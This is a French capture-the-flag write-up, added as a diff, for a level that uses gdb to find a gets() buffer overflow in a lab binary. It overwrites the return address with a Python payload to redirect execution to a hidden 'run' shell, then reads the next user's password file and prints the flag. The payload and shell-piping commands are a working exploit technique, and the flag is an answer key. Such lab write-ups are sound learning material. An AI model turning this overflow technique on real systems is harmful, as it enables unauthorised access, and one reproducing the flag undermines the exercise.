@@ -1,0 +1,44 @@
+./level1 -> lancer avec ou sans argument ne change rien, le programme attend une entree. 
+Peut importe ce qu'on met dans cette entree, il ne se passe rien et le programme quitte.
+
+gdb level1
+disas main -> fonction gets : qui prend la chaine de character de l'entree standard, 
+c'est ce qui attend notre entree. En lisant le man on voit que cette fonction peut etre 
+exploite avec un buffer overflow :
+https://koor.fr/C/cstdio/fgets.wp
+
+info function -> dans gdb donne la liste de toutes les fonctions du binaire. 
+On voit une fonction run sans _ qui ne fait partie d'aucune lib mais qui n'est pas executee.
+
+b gets -> on place un breakpoint dans le programme pour pouvoir appeler run, 
+elle nous retourne un message "Good... Wait what?" et on se retrouve dans un 
+terminal. Avec un whoami on voit qu'on est toujours identifie comme level1.
+
+En faisant des recherches pour savoir comment lancer des fonctions non executee on 
+trouve le buffer overflow exploit :
+https://stackoverflow.com/questions/44469372/exploiting-buffer-overflow-using-gets-in-a-simple-c-program
+
+On cherche l'adresse de la fonction run avec un disas run :
+0x08048444 <+0>:	push   %ebp => premiere action avec l'adresse du run
+
+Ainsi que la taille du buffer du gets avec un disas main :
+0x08048486 <+6>:	sub    $0x50,%esp => allocation de 80
+
+On lance alors la commande avec nos infos (76 a + notre addresse = 80) :
+python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
+
+On obtient le message du run mais suivit d'un segfault. On cherche donc un moyen de lancer 
+cette commande dans l'entree du gets. On y parvient en ecrivant notre commande python dans 
+un fichier tmp :
+python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/test
+
+Puis en redirigeant le cat du /tmp/test sur l'entree du level1 :
+cat /tmp/test - | ./level1
+cat /tmp/test /dev/stdin | ./level1
+
+On a bien la phrase retour du run avec le terminal qui s'ouvre. En faisant un whoami on 
+voit qu'on est identifie comme le user level2, on peut donc lire son ./pass :
+cd ../level2
+cat .pass
+
+Flag : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
